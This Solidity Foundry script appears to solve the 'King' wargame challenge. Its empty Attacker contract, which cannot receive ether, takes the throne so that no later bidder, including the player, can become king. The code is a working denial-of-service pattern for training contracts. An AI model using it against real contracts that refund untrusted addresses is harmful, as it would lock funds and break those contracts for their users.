//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";
import {King} from "../src/King.sol";

contract Attacker {

}

contract DeployKing is Script {

    address player = makeAddr("player");

    function run() external {
        vm.startBroadcast();
        King king = new King{value: 1 ether}();
        vm.stopBroadcast();
        console.log("King deployed at:", address(king));
        console.log("Deployer: ", address(this));
        console.log("Prize: ", king.prize());
        console.log("King: ", king._king());


        Attacker attacker = new Attacker();

        vm.deal(address(attacker), 2 ether);

        vm.prank(address(attacker));
        (bool attackerSuccess, ) = address(king).call{value: 1 ether}("");
        require(attackerSuccess, "Attacker Failed to become king");
        vm.stopPrank();

        console.log("Attacker: ", address(attacker));
        console.log("Prize: ", king.prize());
        console.log("King: ", king._king());

        vm.deal(address(player), 2 ether);

        (bool playerSuccess, ) = address(king).call{value: 2 ether}("");
            
        if (!playerSuccess) {
            console.log("Expected: Player failed to become king");
        }

        console.log("Prize: ", king.prize());
        console.log("King: ", king._king());
    }
}